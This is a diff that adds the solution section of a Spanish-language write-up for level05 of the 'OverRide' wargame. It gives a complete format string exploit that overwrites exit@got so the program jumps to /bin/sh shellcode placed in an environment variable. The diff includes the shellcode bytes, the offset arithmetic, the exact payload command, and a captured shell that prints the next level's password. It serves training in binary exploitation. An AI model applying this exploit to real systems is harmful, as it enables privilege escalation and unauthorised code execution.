@@ -183,3 +183,85 @@ en conjunto con el programa de demostración
 ---
 
 # 6. Solución:
+
+Para resolver este nivel usamos **shellcode en variable de entorno** combinado con **GOT Hijack via Format String**. El bucle de conversión a minúsculas hace inviable meter shellcode directamente en `buf`. Cualquier byte entre `0x41` y `0x5a` sería modificado. La solución es almacenar el shellcode en una variable de entorno fuera del alcance del bucle.
+
+---
+
+## 1. Localizar la dirección de `exit` en la `.got.plt`:
+
+```bash
+level05@OverRide:~$ objdump -R ./level05 | grep exit
+080497e0 R_386_JUMP_SLOT   exit
+```
+
+`exit@got` está en `0x080497e0`.
+
+---
+
+## 2. Preparar el shellcode en variable de entorno:
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90" * 128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+```
+
+Los 128 bytes de NOP sled (`\x90`) garantizan que aunque la dirección no sea
+exacta, la ejecución llegue al shellcode.
+
+---
+
+## 3. Encontrar la dirección del shellcode:
+
+```bash
+cat > /tmp/addr.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+    printf("%p\n", getenv("SHELLCODE"));
+    return 0;
+}
+EOF
+gcc -m32 /tmp/addr.c -o /tmp/addr
+/tmp/addr
+0xffffd863
+```
+
+---
+
+## 4. Construir el payload:
+
+Necesitamos escribir `0xffffd863` en `exit@got`:
+
+```
+exit@got:    0x080497e0  → parte baja:  0xd863 = 55395
+exit@got+2:  0x080497e2  → parte alta:  0xffff = 65535
+
+8 bytes de direcciones ya impresos
+55395 - 8  = 55387
+65535 - 55395 = 10140
+```
+
+```bash
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55387x%10$hn%10140x%11$hn"'; cat) | ./level05
+```
+
+---
+
+## 5. Ejecución:
+
+```bash
+level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55387x%10$hn%10140x%11$hn"'; cat) | ./level05
+$ whoami
+level06
+$ cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+$
+```
+
+---
+
+# 7. Conclusión:
+
+El nivel 05 combina dos restricciones — no hay `system()` en el binario y el bucle de conversión a minúsculas impide meter shellcode directamente en el buffer. La solución pasa por almacenar el shellcode en una variable de entorno (fuera del alcance del bucle) y usar Format String Write para sobrescribir `exit@got` con su dirección.
+
+Cuando el programa llama a `exit(0)`, salta al NOP sled de la variable de entorno y ejecuta el shellcode que lanza `/bin/sh`.
